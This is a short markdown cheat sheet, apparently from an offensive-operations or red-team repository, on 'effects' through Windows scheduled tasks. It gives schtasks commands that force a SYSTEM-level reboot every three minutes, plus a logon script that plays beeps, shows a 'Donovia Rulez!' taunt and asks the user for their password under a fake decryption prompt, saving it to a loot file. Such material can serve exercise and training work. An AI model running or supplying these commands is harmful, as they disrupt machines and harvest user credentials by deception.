<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md">Top of Page</a> |
  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
</p>

# Cheatsheets - Effect
## Table of Contents
* [Scheduled Tasks](#scheduled-tasks)
  * [Rolling Reboot](#rolling-reboot) 

## Scheduled Tasks
### Rolling Reboot
```bash
schtasks.exe /create /tn "Scare" /tr "powershell -c 'C:\scare.ps1'" /sc onlogon /it
schtasks.exe /create /tn "Effect" /tr "shutdown /r /t 000" /ru "SYSTEM" /sc minute /mo 3  
```
```pwsh
# contents of scare.ps1 PowerShell script (plays Imperial March from Star Wars)
[console]::beep(440,500)
[console]::beep(440,500)
[console]::beep(440,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,1000)
[console]::beep(659,500)
[console]::beep(659,500)
[console]::beep(659,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(659,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,1000)
Write-Host "[+] Donovia Rulez!"
Read-Host "[+] Decrypt files with $($env:USERNAME) password" | Out-File -Append C:\Users\Public\loot.txt
Start-Sleep -Seconds 5
```

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md">Top of Page</a> |
  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
